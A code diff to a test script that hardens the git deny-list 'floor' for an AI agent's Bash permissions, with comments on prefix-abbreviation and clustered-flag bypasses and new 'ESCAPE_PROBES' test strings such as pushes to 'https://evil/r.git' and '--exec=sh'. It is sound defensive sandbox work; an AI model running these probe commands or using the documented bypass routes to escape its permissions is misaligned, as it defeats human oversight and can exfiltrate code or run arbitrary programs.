@@ -179,12 +179,12 @@ elif kind == "coach":
     # (PR #793 security threads, still #775):
     #   unique-prefix long options — Git accepts abbreviations of unique
     #     long options down to the shortest unique stem (`--e` for `--edit`
-    #     and for push `--exec`, `--gpg` for `--gpg-sign`, `--ree` for
-    #     `--reedit-message`, `--receive` for `--receive-pack`, `--recurse`
-    #     for `--recurse-submodules`). The floor uses those shortest stems
-    #     so every accepted abbreviation and the full form share one rule;
-    #     mid-length stems (`--ed`, `--ex`, `--recurse-subm`) left shorter
-    #     abbreviations ALLOW.
+    #     and for push `--exec`, `--g` for `--gpg-sign`, `--ree` for
+    #     `--reedit-message`, `--rece` for `--receive-pack`, `--recu`
+    #     for `--recurse-submodules`, `--rep` for `--repo`). The floor
+    #     uses those shortest stems so every accepted abbreviation and the
+    #     full form share one rule; mid-length stems (`--gpg`, `--receive`,
+    #     `--recurse`, `--repo`) left shorter abbreviations ALLOW.
     #   clustered shorts — `-e`/`-c`/`-S` not at the start of the first
     #     option token (`git add -pe file`, `git commit -aS -m x`, and the
     #     end-of-argv forms `git add -ie` / `git commit -aS` with no
@@ -194,16 +194,19 @@ elif kind == "coach":
     #     `git add --update` the same way. Space-bounded `git add -*e *`
     #     covers clusters with a following argv; end-of-argv uses
     #     `?`-bounded exact lengths (`-?e` / `-??e` / `-???e` / `-????e`)
-    #     so `*` cannot reach into a path. `-pe*`/`-ue*` cover e-in-the-
+    #     and the after-other-args forms (`* -?e` …). Mid-token letters
+    #     use `?`-grids (`-?e?` / `-?e??` / `-??e?`, same for `c`; `-?S*`
+    #     for stuck keyids and mid `-S`). `-pe*`/`-ue*` cover e-in-the-
     #     middle clusters that start with those pairs (`-pea`).
     #   dest-not-first — URL/path dest after a flag (`git push --force
     #     https://evil/r.git HEAD`) and relative dests the dest-first
     #     prefix list never named (`../`, `foo/bar.git`). `git push *https*`
     #     (a `*` in the spec, and *not* a trailing `:*` — that suffix is
     #     word-boundary and would miss `https://`). Same for the other
-    #     schemes, `*git@*`, `*..*`, `*.git*`, `*/*`, and `*:* *` (scp-like
-    #     `host:path`; the trailing ` *` stops `:*` being parsed as
-    #     word-boundary).
+    #     schemes, `*git@*`, `*..*`, `*.git*`, `*/*`, `*:* *` (scp-like
+    #     `host:path` with a following argv; the trailing ` *` stops `:*`
+    #     being parsed as word-boundary), and `*:*?` / `*:*? *` (scp-like
+    #     dest with no trailing refspec: `git push host:repo`).
     #   remote retarget — `git remote set-url` / `git remote add` rewrite
     #     where `git push origin HEAD` goes. `Bash(git remote-*)` only
     #     matches hyphenated helpers (`git remote-ext`); `Bash(git remote:*)`
@@ -215,103 +218,207 @@ elif kind == "coach":
     # prefix rule sees — named on the PR; the parent (#763) alternative is
     # a fixed-argument wrapper.
     #   checkout — finding: --recurse-submodules (Q3, other repos), denied
-    #     at shortest unique prefix `--recurse`. Nothing else of checkout
+    #     at shortest unique prefix `--recu`. Nothing else of checkout
     #     meets the three questions (quiet/force/track/detach/orphan/merge/
     #     conflict/patch/pathspec-from-file do not exec, do not move
     #     credentials, do not reach another repo).
     #   add — finding: --edit/-e (Q1, opens GIT_EDITOR), including shortest
-    #     unique prefix `--e` and clustered `-pe`/`-ue`/`-*e *`/`-?e`.
-    #     Nothing else of add meets the three questions (interactive/patch/
-    #     chmod/pathspec-from-file/renormalize are local index ops).
+    #     unique prefix `--e` and clustered `-pe`/`-ue`/`-*e *`/`-?e`/
+    #     mid-token `-?e?` grids / after-args `* -?e`. Nothing else of
+    #     add meets the three questions (interactive/patch/chmod/
+    #     pathspec-from-file/renormalize are local index ops).
     #   commit — findings: --edit/-e and --reedit-message/-c (Q1, editor;
     #     shortest unique prefixes `--e` / `--ree`); --gpg-sign/-S (Q1,
-    #     runs gpg; shortest unique prefix `--gpg`; -Skeyid is a stuck
-    #     combined form); clustered `-aS`/`-sS`/`-amS` via `-*S *`/`-?S`,
-    #     clustered `-ae`/`-ac` via `-*e *`/`-?e`/`-*c *`/`-?c`. Bare
-    #     `git commit` (no -m) also launches the editor: that is not an
-    #     option a prefix can refuse without swallowing `git commit -m`, so
-    #     it is the wrapper case, not a deny. Other options (message/file/
-    #     author/date/amend/signoff/trailer/cleanup/pathspec-from-file) do
-    #     not meet the three questions.
+    #     runs gpg; shortest unique prefix `--g`; -Skeyid is a stuck
+    #     combined form via `-?S*`); clustered `-aS`/`-sS`/`-amS` via
+    #     `-*S *`/`-?S`, clustered `-ae`/`-ac`/`-aem` via `-*e *`/`-?e`/
+    #     `-?e?` / `-*c *`/`-?c`/`-?c?`. Bare `git commit` (no -m) also
+    #     launches the editor: that is not an option a prefix can refuse
+    #     without swallowing `git commit -m`, so it is the wrapper case,
+    #     not a deny. Other options (message/file/author/date/amend/
+    #     signoff/trailer/cleanup/pathspec-from-file) do not meet the
+    #     three questions.
     #   push — findings: --receive-pack/--exec (Q1; shortest unique
-    #     prefixes `--receive` / `--e`); --repo (Q3); --recurse-submodules
-    #     (Q3; shortest unique prefix `--recurse`); a URL or path as the
-    #     repository argument (Q3: https/http/ssh/git/ftp/file/ext::,
-    #     scp-like git@, absolute /, ./, ., ~, dest-not-first of those,
-    #     relative `../` / `*.git` / any `/`). --set-upstream/--force/
-    #     --thin/--signed/--push-option/--verify do not meet the three
-    #     questions as options (hooks are the env lock).
+    #     prefixes `--rece` / `--e`); --repo (Q3; `--rep`); --recurse-
+    #     submodules (Q3; `--recu`); a URL or path as the repository
+    #     argument (Q3: https/http/ssh/git/ftp/file/ext::, scp-like git@
+    #     and `host:path` with or without a following refspec via
+    #     `*:* *` / `*:*?`, absolute /, ./, ., ~, dest-not-first of
+    #     those, relative `../` / `*.git` / any `/`). --set-upstream/
+    #     --force/--thin/--signed/--push-option/--verify do not meet the
+    #     three questions as options (hooks are the env lock).
     GIT_FLOOR = [
-        {"Bash(git -*)"},
-        {"Bash(git -c:*)"}, {"Bash(git -c*)"}, {"Bash(git -C:*)"}, {"Bash(git -C*)"},
-        {"Bash(git --config-env:*)"}, {"Bash(git --config-env*)"},
-        {"Bash(git --exec-path:*)"}, {"Bash(git --exec-path*)"},
-        {"Bash(git --git-dir:*)"}, {"Bash(git --git-dir*)"},
-        {"Bash(git --work-tree:*)"}, {"Bash(git --work-tree*)"},
-        {"Bash(git --bare:*)"}, {"Bash(git --bare*)"},
-        {"Bash(git --namespace:*)"}, {"Bash(git --namespace*)"},
-        {"Bash(git fetch:*)"}, {"Bash(git clone:*)"}, {"Bash(git pull:*)"},
-        {"Bash(git ls-remote:*)"},
-        {"Bash(git config:*)"}, {"Bash(git submodule:*)"},
-        {"Bash(git bisect:*)"}, {"Bash(git rebase:*)"},
-        {"Bash(git filter-branch:*)"}, {"Bash(git difftool:*)"},
-        {"Bash(git mergetool:*)"}, {"Bash(git daemon:*)"},
-        {"Bash(git archive:*)"}, {"Bash(git upload-pack:*)"},
+        {"Bash(git -c:*)"},
+        {"Bash(git -C:*)"},
+        {"Bash(git --config-env:*)"},
+        {"Bash(git --exec-path:*)"},
+        {"Bash(git config:*)"},
+        {"Bash(git submodule:*)"},
+        {"Bash(git bisect:*)"},
+        {"Bash(git rebase:*)"},
+        {"Bash(git filter-branch:*)"},
+        {"Bash(git difftool:*)"},
+        {"Bash(git mergetool:*)"},
+        {"Bash(git daemon:*)"},
+        {"Bash(git archive:*)"},
+        {"Bash(git upload-pack:*)"},
         {"Bash(git upload-archive:*)"},
-        {"Bash(git credential:*)"}, {"Bash(git credential*)"},
+        {"Bash(git credential:*)"},
+        {"Bash(git -c*)"},
+        {"Bash(git -C*)"},
+        {"Bash(git --config-env*)"},
+        {"Bash(git --exec-path*)"},
+        {"Bash(git --git-dir:*)"},
+        {"Bash(git --git-dir*)"},
+        {"Bash(git --work-tree:*)"},
+        {"Bash(git --work-tree*)"},
+        {"Bash(git --bare:*)"},
+        {"Bash(git --bare*)"},
+        {"Bash(git --namespace:*)"},
+        {"Bash(git --namespace*)"},
+        {"Bash(git -*)"},
+        {"Bash(git fetch:*)"},
+        {"Bash(git clone:*)"},
+        {"Bash(git pull:*)"},
+        {"Bash(git ls-remote:*)"},
+        {"Bash(git credential*)"},
         {"Bash(git grep:*)"},
-        {"Bash(git remote:*)"}, {"Bash(git remote*)"}, {"Bash(git remote-*)"},
-        {"Bash(git instaweb:*)"}, {"Bash(git send-email:*)"},
-        {"Bash(git add --e:*)"}, {"Bash(git add --e*)"},
-        {"Bash(git add -e:*)"}, {"Bash(git add -e*)"},
-        {"Bash(git add -pe:*)"}, {"Bash(git add -pe*)"},
-        {"Bash(git add -ue:*)"}, {"Bash(git add -ue*)"},
+        {"Bash(git remote:*)"},
+        {"Bash(git remote*)"},
+        {"Bash(git remote-*)"},
+        {"Bash(git instaweb:*)"},
+        {"Bash(git send-email:*)"},
+        {"Bash(git add --e:*)"},
+        {"Bash(git add --e*)"},
+        {"Bash(git add -e:*)"},
+        {"Bash(git add -e*)"},
+        {"Bash(git add -pe:*)"},
+        {"Bash(git add -pe*)"},
+        {"Bash(git add -ue:*)"},
+        {"Bash(git add -ue*)"},
         {"Bash(git add -*e *)"},
-        {"Bash(git add -?e)"}, {"Bash(git add -??e)"},
-        {"Bash(git add -???e)"}, {"Bash(git add -????e)"},
-        {"Bash(git checkout --recurse:*)"},
-        {"Bash(git checkout --recurse*)"},
-        {"Bash(git commit --e:*)"}, {"Bash(git commit --e*)"},
-        {"Bash(git commit -e:*)"}, {"Bash(git commit -e*)"},
+        {"Bash(git add -?e)"},
+        {"Bash(git add -??e)"},
+        {"Bash(git add -???e)"},
+        {"Bash(git add -????e)"},
+        {"Bash(git add * -?e)"},
+        {"Bash(git add * -??e)"},
+        {"Bash(git add * -???e)"},
+        {"Bash(git add * -????e)"},
+        {"Bash(git add -?e?)"},
+        {"Bash(git add -?e? *)"},
+        {"Bash(git add * -?e?)"},
+        {"Bash(git add * -?e? *)"},
+        {"Bash(git add -?e??)"},
+        {"Bash(git add -?e?? *)"},
+        {"Bash(git add * -?e??)"},
+        {"Bash(git add * -?e?? *)"},
+        {"Bash(git add -??e?)"},
+        {"Bash(git add -??e? *)"},
+        {"Bash(git add * -??e?)"},
+        {"Bash(git add * -??e? *)"},
+        {"Bash(git checkout --recu:*)"},
+        {"Bash(git checkout --recu*)"},
+        {"Bash(git commit --e:*)"},
+        {"Bash(git commit --e*)"},
+        {"Bash(git commit -e:*)"},
+        {"Bash(git commit -e*)"},
         {"Bash(git commit -*e *)"},
-        {"Bash(git commit -?e)"}, {"Bash(git commit -??e)"},
-        {"Bash(git commit -???e)"}, {"Bash(git commit -????e)"},
+        {"Bash(git commit -?e)"},
+        {"Bash(git commit -??e)"},
+        {"Bash(git commit -???e)"},
+        {"Bash(git commit -????e)"},
+        {"Bash(git commit * -?e)"},
+        {"Bash(git commit * -??e)"},
+        {"Bash(git commit * -???e)"},
+        {"Bash(git commit * -????e)"},
+        {"Bash(git commit -?e?)"},
+        {"Bash(git commit -?e? *)"},
+        {"Bash(git commit * -?e?)"},
+        {"Bash(git commit * -?e? *)"},
+        {"Bash(git commit -?e??)"},
+        {"Bash(git commit -?e?? *)"},
+        {"Bash(git commit * -?e??)"},
+        {"Bash(git commit * -?e?? *)"},
+        {"Bash(git commit -??e?)"},
+        {"Bash(git commit -??e? *)"},
+        {"Bash(git commit * -??e?)"},
+        {"Bash(git commit * -??e? *)"},
         {"Bash(git commit --ree:*)"},
         {"Bash(git commit --ree*)"},
-        {"Bash(git commit -c:*)"}, {"Bash(git commit -c*)"},
+        {"Bash(git commit -c:*)"},
+        {"Bash(git commit -c*)"},
         {"Bash(git commit -*c *)"},
-        {"Bash(git commit -?c)"}, {"Bash(git commit -??c)"},
-        {"Bash(git commit -???c)"}, {"Bash(git commit -????c)"},
-        {"Bash(git commit --gpg:*)"}, {"Bash(git commit --gpg*)"},
-        {"Bash(git commit -S:*)"}, {"Bash(git commit -S*)"},
+        {"Bash(git commit -?c)"},
+        {"Bash(git commit -??c)"},
+        {"Bash(git commit -???c)"},
+        {"Bash(git commit -????c)"},
+        {"Bash(git commit * -?c)"},
+        {"Bash(git commit * -??c)"},
+        {"Bash(git commit * -???c)"},
+        {"Bash(git commit * -????c)"},
+        {"Bash(git commit -?c?)"},
+        {"Bash(git commit -?c? *)"},
+        {"Bash(git commit * -?c?)"},
+        {"Bash(git commit * -?c? *)"},
+        {"Bash(git commit --g:*)"},
+        {"Bash(git commit --g*)"},
+        {"Bash(git commit -S:*)"},
+        {"Bash(git commit -S*)"},
         {"Bash(git commit -*S *)"},
-        {"Bash(git commit -?S)"}, {"Bash(git commit -??S)"},
-        {"Bash(git commit -???S)"}, {"Bash(git commit -????S)"},
-        {"Bash(git push --receive:*)"}, {"Bash(git push --receive*)"},
-        {"Bash(git push --e:*)"}, {"Bash(git push --e*)"},
-        {"Bash(git push --repo:*)"}, {"Bash(git push --repo*)"},
-        {"Bash(git push --recurse:*)"},
-        {"Bash(git push --recurse*)"},
-        {"Bash(git push https:*)"}, {"Bash(git push https*)"},
+        {"Bash(git commit -?S)"},
+        {"Bash(git commit -??S)"},
+        {"Bash(git commit -???S)"},
+        {"Bash(git commit -????S)"},
+        {"Bash(git commit -?S*)"},
+        {"Bash(git commit * -?S*)"},
+        {"Bash(git commit -??S *)"},
+        {"Bash(git commit * -??S)"},
+        {"Bash(git commit * -??S *)"},
+        {"Bash(git push --rece:*)"},
+        {"Bash(git push --rece*)"},
+        {"Bash(git push --e:*)"},
+        {"Bash(git push --e*)"},
+        {"Bash(git push --rep:*)"},
+        {"Bash(git push --rep*)"},
+        {"Bash(git push --recu:*)"},
+        {"Bash(git push --recu*)"},
+        {"Bash(git push https:*)"},
+        {"Bash(git push https*)"},
         {"Bash(git push *https*)"},
-        {"Bash(git push http:*)"}, {"Bash(git push http*)"},
+        {"Bash(git push http:*)"},
+        {"Bash(git push http*)"},
         {"Bash(git push *http://*)"},
-        {"Bash(git push ssh:*)"}, {"Bash(git push ssh*)"},
+        {"Bash(git push ssh:*)"},
+        {"Bash(git push ssh*)"},
         {"Bash(git push *ssh://*)"},
-        {"Bash(git push git:*)"}, {"Bash(git push git*)"},
-        {"Bash(git push *git://*)"}, {"Bash(git push *git@*)"},
-        {"Bash(git push ftp:*)"}, {"Bash(git push ftp*)"},
+        {"Bash(git push git:*)"},
+        {"Bash(git push git*)"},
+        {"Bash(git push *git://*)"},
+        {"Bash(git push *git@*)"},
+        {"Bash(git push ftp:*)"},
+        {"Bash(git push ftp*)"},
         {"Bash(git push *ftp://*)"},
-        {"Bash(git push file:*)"}, {"Bash(git push file*)"},
+        {"Bash(git push file:*)"},
+        {"Bash(git push file*)"},
         {"Bash(git push *file://*)"},
-        {"Bash(git push ext:*)"}, {"Bash(git push ext*)"},
+        {"Bash(git push ext:*)"},
+        {"Bash(git push ext*)"},
         {"Bash(git push *ext*)"},
-        {"Bash(git push /:*)"}, {"Bash(git push /*)"},
-        {"Bash(git push ./:*)"}, {"Bash(git push ./*)"},
-        {"Bash(git push .)"}, {"Bash(git push . *)"},
-        {"Bash(git push ~:*)"}, {"Bash(git push ~*)"},
-        {"Bash(git push *..*)"}, {"Bash(git push *.git*)"},
-        {"Bash(git push */*)"}, {"Bash(git push *:* *)"},
+        {"Bash(git push /:*)"},
+        {"Bash(git push /*)"},
+        {"Bash(git push ./:*)"},
+        {"Bash(git push ./*)"},
+        {"Bash(git push .)"},
+        {"Bash(git push . *)"},
+        {"Bash(git push ~:*)"},
+        {"Bash(git push ~*)"},
+        {"Bash(git push *..*)"},
+        {"Bash(git push *.git*)"},
+        {"Bash(git push */*)"},
+        {"Bash(git push *:* *)"},
+        {"Bash(git push *:*?)"},
+        {"Bash(git push *:*? *)"},
     ]
 else:
     sys.stderr.write(f"unknown backstop kind {kind!r}\n")
@@ -396,25 +503,32 @@ ESCAPE_PROBES = [
     "git add --edit file", "git add --ed file", "git add --e", "git add --e file",
     "git add -e file", "git add -ie", "git add -pue", "git add -ipue",
     "git add -pe file", "git add -ue file", "git add -pea file",
+    "git add -iep file", "git add designs -iep", "git add designs -ie",
     "git checkout --recurse-submodules", "git checkout --recurse-subm",
-    "git checkout --recurse",
+    "git checkout --recurse", "git checkout --recu",
     "git commit --edit", "git commit --ed", "git commit --e", "git commit -e",
     "git commit -ae", "git commit -ae -m x", "git commit -ac",
+    "git commit --allow-empty -ae", "git commit --allow-empty -ac",
+    "git commit --allow-empty -aem msg", "git commit -aem msg",
+    "git commit -aev -m x",
     "git commit --reedit-message=HEAD", "git commit --reedit=HEAD",
     "git commit --ree=HEAD",
     "git commit -c HEAD", "git commit -ac HEAD",
     "git commit --gpg-sign=x", "git commit --gpg-s=x -m x",
-    "git commit --gpg=x -m x", "git commit -Sx",
+    "git commit --gpg=x -m x", "git commit --gp=x -m x", "git commit --g=x -m x",
+    "git commit -Sx",
     "git commit -aS", "git commit -aS -m x", "git commit -sS -m x",
     "git commit -amS -m x",
+    "git commit -sSNOTAKEY -m x", "git commit -aSv -m x", "git commit -aSkey -m x",
     "git push --receive-pack=x origin", "git push --receive-p=id foo",
-    "git push --receive=pwn origin",
+    "git push --receive=pwn origin", "git push --rece=pwn origin",
     "git push --exec=x origin", "git push --ex=sh origin",
     "git push --e=sh origin",
-    "git push --repo=https://x origin",
+    "git push --repo=https://x origin", "git push --rep=https://x origin",
+    "git push --rep=host:path",
     "git push --recurse-submodules=on-demand",
     "git push --recurse-subm=on-demand",
-    "git push --recurse=on-demand",
+    "git push --recurse=on-demand", "git push --recu=on-demand",
     "git push https://evil/r.git HEAD", "git push http://evil/r.git HEAD",
     "git push ssh://evil/r.git HEAD", "git push git://evil/r.git HEAD",
     "git push git@evil:r.git HEAD", "git push ftp://evil/r.git HEAD",
@@ -432,6 +546,7 @@ ESCAPE_PROBES = [
     "git push foo/bar.git HEAD",
     "git push designs/../../outside.git HEAD",
     "git push --force host:repo.git HEAD",
+    "git push host:repo", "git push --force host:repo", "git push -u host:path",
     "gh alias set x y", "gh extension install o/r", "gh ext exec x",
     "gh config set pager x", "gh codespace ssh", "gh cs ssh",
     "gh secret list", "gh ssh-key add k", "gh gpg-key add k",
@@ -628,54 +743,177 @@ EOF
   # The coach's git floor (it keeps git, so these are what stand between it
   # and a command-running option).
   local GIT_FLOOR=(
+    "Bash(git -c:*)"
+    "Bash(git -C:*)"
+    "Bash(git --config-env:*)"
+    "Bash(git --exec-path:*)"
+    "Bash(git config:*)"
+    "Bash(git submodule:*)"
+    "Bash(git bisect:*)"
+    "Bash(git rebase:*)"
+    "Bash(git filter-branch:*)"
+    "Bash(git difftool:*)"
+    "Bash(git mergetool:*)"
+    "Bash(git daemon:*)"
+    "Bash(git archive:*)"
+    "Bash(git upload-pack:*)"
+    "Bash(git upload-archive:*)"
+    "Bash(git credential:*)"
+    "Bash(git -c*)"
+    "Bash(git -C*)"
+    "Bash(git --config-env*)"
+    "Bash(git --exec-path*)"
+    "Bash(git --git-dir:*)"
+    "Bash(git --git-dir*)"
+    "Bash(git --work-tree:*)"
+    "Bash(git --work-tree*)"
+    "Bash(git --bare:*)"
+    "Bash(git --bare*)"
+    "Bash(git --namespace:*)"
+    "Bash(git --namespace*)"
     "Bash(git -*)"
-    "Bash(git -c:*)" "Bash(git -c*)" "Bash(git -C:*)" "Bash(git -C*)"
-    "Bash(git --config-env:*)" "Bash(git --config-env*)"
-    "Bash(git --exec-path:*)" "Bash(git --exec-path*)"
-    "Bash(git --git-dir:*)" "Bash(git --git-dir*)"
-    "Bash(git --work-tree:*)" "Bash(git --work-tree*)"
-    "Bash(git --bare:*)" "Bash(git --bare*)"
-    "Bash(git --namespace:*)" "Bash(git --namespace*)"
-    "Bash(git fetch:*)" "Bash(git clone:*)" "Bash(git pull:*)" "Bash(git ls-remote:*)"
-    "Bash(git config:*)" "Bash(git submodule:*)" "Bash(git bisect:*)" "Bash(git rebase:*)"
-    "Bash(git filter-branch:*)" "Bash(git difftool:*)" "Bash(git mergetool:*)"
-    "Bash(git daemon:*)" "Bash(git archive:*)" "Bash(git upload-pack:*)"
-    "Bash(git upload-archive:*)" "Bash(git credential:*)" "Bash(git credential*)"
+    "Bash(git fetch:*)"
+    "Bash(git clone:*)"
+    "Bash(git pull:*)"
+    "Bash(git ls-remote:*)"
+    "Bash(git credential*)"
     "Bash(git grep:*)"
-    "Bash(git remote:*)" "Bash(git remote*)" "Bash(git remote-*)"
-    "Bash(git instaweb:*)" "Bash(git send-email:*)"
-    "Bash(git add --e:*)" "Bash(git add --e*)" "Bash(git add -e:*)" "Bash(git add -e*)"
-    "Bash(git add -pe:*)" "Bash(git add -pe*)" "Bash(git add -ue:*)" "Bash(git add -ue*)"
+    "Bash(git remote:*)"
+    "Bash(git remote*)"
+    "Bash(git remote-*)"
+    "Bash(git instaweb:*)"
+    "Bash(git send-email:*)"
+    "Bash(git add --e:*)"
+    "Bash(git add --e*)"
+    "Bash(git add -e:*)"
+    "Bash(git add -e*)"
+    "Bash(git add -pe:*)"
+    "Bash(git add -pe*)"
+    "Bash(git add -ue:*)"
+    "Bash(git add -ue*)"
     "Bash(git add -*e *)"
-    "Bash(git add -?e)" "Bash(git add -??e)" "Bash(git add -???e)" "Bash(git add -????e)"
-    "Bash(git checkout --recurse:*)" "Bash(git checkout --recurse*)"
-    "Bash(git commit --e:*)" "Bash(git commit --e*)" "Bash(git commit -e:*)" "Bash(git commit -e*)"
+    "Bash(git add -?e)"
+    "Bash(git add -??e)"
+    "Bash(git add -???e)"
+    "Bash(git add -????e)"
+    "Bash(git add * -?e)"
+    "Bash(git add * -??e)"
+    "Bash(git add * -???e)"
+    "Bash(git add * -????e)"
+    "Bash(git add -?e?)"
+    "Bash(git add -?e? *)"
+    "Bash(git add * -?e?)"
+    "Bash(git add * -?e? *)"
+    "Bash(git add -?e??)"
+    "Bash(git add -?e?? *)"
+    "Bash(git add * -?e??)"
+    "Bash(git add * -?e?? *)"
+    "Bash(git add -??e?)"
+    "Bash(git add -??e? *)"
+    "Bash(git add * -??e?)"
+    "Bash(git add * -??e? *)"
+    "Bash(git checkout --recu:*)"
+    "Bash(git checkout --recu*)"
+    "Bash(git commit --e:*)"
+    "Bash(git commit --e*)"
+    "Bash(git commit -e:*)"
+    "Bash(git commit -e*)"
     "Bash(git commit -*e *)"
-    "Bash(git commit -?e)" "Bash(git commit -??e)" "Bash(git commit -???e)" "Bash(git commit -????e)"
-    "Bash(git commit --ree:*)" "Bash(git commit --ree*)"
-    "Bash(git commit -c:*)" "Bash(git commit -c*)" "Bash(git commit -*c *)"
-    "Bash(git commit -?c)" "Bash(git commit -??c)" "Bash(git commit -???c)" "Bash(git commit -????c)"
-    "Bash(git commit --gpg:*)" "Bash(git commit --gpg*)"
-    "Bash(git commit -S:*)" "Bash(git commit -S*)" "Bash(git commit -*S *)"
-    "Bash(git commit -?S)" "Bash(git commit -??S)" "Bash(git commit -???S)" "Bash(git commit -????S)"
-    "Bash(git push --receive:*)" "Bash(git push --receive*)"
-    "Bash(git push --e:*)" "Bash(git push --e*)"
-    "Bash(git push --repo:*)" "Bash(git push --repo*)"
-    "Bash(git push --recurse:*)" "Bash(git push --recurse*)"
-    "Bash(git push https:*)" "Bash(git push https*)" "Bash(git push *https*)"
-    "Bash(git push http:*)" "Bash(git push http*)" "Bash(git push *http://*)"
-    "Bash(git push ssh:*)" "Bash(git push ssh*)" "Bash(git push *ssh://*)"
-    "Bash(git push git:*)" "Bash(git push git*)"
-    "Bash(git push *git://*)" "Bash(git push *git@*)"
-    "Bash(git push ftp:*)" "Bash(git push ftp*)" "Bash(git push *ftp://*)"
-    "Bash(git push file:*)" "Bash(git push file*)" "Bash(git push *file://*)"
-    "Bash(git push ext:*)" "Bash(git push ext*)" "Bash(git push *ext*)"
-    "Bash(git push /:*)" "Bash(git push /*)"
-    "Bash(git push ./:*)" "Bash(git push ./*)"
-    "Bash(git push .)" "Bash(git push . *)"
-    "Bash(git push ~:*)" "Bash(git push ~*)"
-    "Bash(git push *..*)" "Bash(git push *.git*)"
-    "Bash(git push */*)" "Bash(git push *:* *)"
+    "Bash(git commit -?e)"
+    "Bash(git commit -??e)"
+    "Bash(git commit -???e)"
+    "Bash(git commit -????e)"
+    "Bash(git commit * -?e)"
+    "Bash(git commit * -??e)"
+    "Bash(git commit * -???e)"
+    "Bash(git commit * -????e)"
+    "Bash(git commit -?e?)"
+    "Bash(git commit -?e? *)"
+    "Bash(git commit * -?e?)"
+    "Bash(git commit * -?e? *)"
+    "Bash(git commit -?e??)"
+    "Bash(git commit -?e?? *)"
+    "Bash(git commit * -?e??)"
+    "Bash(git commit * -?e?? *)"
+    "Bash(git commit -??e?)"
+    "Bash(git commit -??e? *)"
+    "Bash(git commit * -??e?)"
+    "Bash(git commit * -??e? *)"
+    "Bash(git commit --ree:*)"
+    "Bash(git commit --ree*)"
+    "Bash(git commit -c:*)"
+    "Bash(git commit -c*)"
+    "Bash(git commit -*c *)"
+    "Bash(git commit -?c)"
+    "Bash(git commit -??c)"
+    "Bash(git commit -???c)"
+    "Bash(git commit -????c)"
+    "Bash(git commit * -?c)"
+    "Bash(git commit * -??c)"
+    "Bash(git commit * -???c)"
+    "Bash(git commit * -????c)"
+    "Bash(git commit -?c?)"
+    "Bash(git commit -?c? *)"
+    "Bash(git commit * -?c?)"
+    "Bash(git commit * -?c? *)"
+    "Bash(git commit --g:*)"
+    "Bash(git commit --g*)"
+    "Bash(git commit -S:*)"
+    "Bash(git commit -S*)"
+    "Bash(git commit -*S *)"
+    "Bash(git commit -?S)"
+    "Bash(git commit -??S)"
+    "Bash(git commit -???S)"
+    "Bash(git commit -????S)"
+    "Bash(git commit -?S*)"
+    "Bash(git commit * -?S*)"
+    "Bash(git commit -??S *)"
+    "Bash(git commit * -??S)"
+    "Bash(git commit * -??S *)"
+    "Bash(git push --rece:*)"
+    "Bash(git push --rece*)"
+    "Bash(git push --e:*)"
+    "Bash(git push --e*)"
+    "Bash(git push --rep:*)"
+    "Bash(git push --rep*)"
+    "Bash(git push --recu:*)"
+    "Bash(git push --recu*)"
+    "Bash(git push https:*)"
+    "Bash(git push https*)"
+    "Bash(git push *https*)"
+    "Bash(git push http:*)"
+    "Bash(git push http*)"
+    "Bash(git push *http://*)"
+    "Bash(git push ssh:*)"
+    "Bash(git push ssh*)"
+    "Bash(git push *ssh://*)"
+    "Bash(git push git:*)"
+    "Bash(git push git*)"
+    "Bash(git push *git://*)"
+    "Bash(git push *git@*)"
+    "Bash(git push ftp:*)"
+    "Bash(git push ftp*)"
+    "Bash(git push *ftp://*)"
+    "Bash(git push file:*)"
+    "Bash(git push file*)"
+    "Bash(git push *file://*)"
+    "Bash(git push ext:*)"
+    "Bash(git push ext*)"
+    "Bash(git push *ext*)"
+    "Bash(git push /:*)"
+    "Bash(git push /*)"
+    "Bash(git push ./:*)"
+    "Bash(git push ./*)"
+    "Bash(git push .)"
+    "Bash(git push . *)"
+    "Bash(git push ~:*)"
+    "Bash(git push ~*)"
+    "Bash(git push *..*)"
+    "Bash(git push *.git*)"
+    "Bash(git push */*)"
+    "Bash(git push *:* *)"
+    "Bash(git push *:*?)"
+    "Bash(git push *:*? *)"
   )
   python3 - "$tmp/reviewer.json" "${GH_FLOOR[@]}" <<'PY2'
 import json, sys
